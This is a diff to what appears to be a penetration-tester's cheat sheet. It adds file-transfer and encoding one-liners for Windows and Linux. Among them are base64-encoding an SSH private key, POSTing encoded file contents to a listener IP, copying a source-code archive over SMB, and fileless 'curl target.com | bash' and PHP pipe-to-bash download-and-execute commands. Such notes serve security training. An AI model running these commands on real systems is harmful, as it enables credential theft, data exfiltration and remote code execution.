@@ -102,6 +102,20 @@ ii. site:example/com filetype:sql
 
 
 
+**ENCODING & DECODING**
+1. Powershell
+. encode file = [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+. decode base64 = echo filehash | base64 -d > hosts
+. check legitness of file = md5sum hosts
+2. Linux
+. encode ssh key to base64:
+a) cat id_rsa |base64 -w 0;echo
+b) echo -n ‘ssh key’ | base64 -d > id_rsa
+
+
+
+
+
 **FTP**
 . vstpfd config file = cat /etc/vsftpd.conf | grep -v "#”
 . ftpusers check = cat /etc/ftpusers
@@ -376,8 +390,8 @@ python3 ssh-audit.py IP
 . wget: 
 a) setup listener = python3 -m http.server 8000
 b) transfer file = wget http://targetip:8000/filename
-. curl http://targetip:8000/filename -o filename
-. scp filename username@targetip:filedirectory
+. curl = curl http://targetip:8000/filename -o filename
+. scp = scp filename username@targetip:filedirectory
 . Base64: 
 a) base64 filename -w 0
 b) echo filecontent | base64 -d > filename
@@ -400,6 +414,33 @@ a) $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System
 b) Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
 c) nc -lvnp 8000
 d) echo <base64> | base64 -d -w 0 > hosts
+2. SMB Powershell
+. mount smb with username and password = net use n: \\IP\share /user:test test
+. upload SMB = copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
+3. FTP Powershell
+. (New-Object Net.WebClient).DownloadFile('[ftp://192.168.49.128/file.txt](ftp://192.168.49.128/file.txt)', 'C:\Users\Public\ftp-file.txt')
+. download file from FTP server = GET file.txt
+. upload file FTP = PUT c:\windows\system32\drivers\etc\hosts
+4. Linux
+. wget = wget target.com -O /tmp/file.txt
+. curl = curl -o /tmp/file.txt target.com
+. download fileless method curl = curl target.com | bash
+. download fileless method wget =  wget -qO- target.com | python3
+. bash:
+a) connect to target webserver = exec 3<>/dev/tcp/IP/80
+b) HTTP GET Request = echo -e "GET /file.txt HTTP/1.1\n\n">&3
+c) Print the response = cat <&3
+5. SSH Linux
+a) check SSH listening port = netstat -lnpt
+b) scp plaintext@192.168.49.128:/root/myroot.txt
+6. Python
+.  python3 -c 'import urllib.request;urllib.request.urlretrieve("target.com", "file.txt")'
+7. PHP
+. using file_get_contents() = php -r '$file = file_get_contents("target.com"); file_put_contents("file.txt",$file);'
+. using fopen(): 
+a) php -r 'const BUFFER = 1024; $fremote =
+b) fopen("target.com", "rb"); $flocal = fopen("file.txt", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+. download and pipe it to bash = php -r '$lines = @file("target.com"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 
 
 
